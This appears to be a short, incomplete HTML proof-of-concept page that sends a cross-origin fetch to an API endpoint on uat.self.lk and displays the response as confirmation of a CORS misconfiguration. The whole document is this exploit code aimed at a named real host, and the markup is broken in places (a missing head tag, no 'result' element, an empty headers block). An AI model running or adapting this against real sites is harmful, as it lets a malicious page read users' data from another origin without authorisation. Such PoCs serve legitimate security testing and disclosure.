<html>

  <title>CORS PoC</title>
</head>
<body>

  <script>

      document.getElementById('result').innerText = 'Sending request...';

      fetch('https://uat.self.lk/mb/auth/api/v1/splash/', {

        headers: {

        },
        body: 'test'
      })
      .then(response => {
        return response.text().then(data => {
          document.getElementById('result').innerText =
            '✅ CORS VULNERABILITY CONFIRMED\n\n' +
            'Status: ' + response.status + '\n' +
            'This page origin: ' + window.location.origin + '\n' +
            'Target origin: https://uat.self.lk\n\n' +
            'Response data readable from foreign origin:\n' +
            data.substring(0, 300) + '...';
        });
      })
      .catch(error => {
        document.getElementById('result').innerText =
          '❌ Request blocked by browser\n' + error;
      });
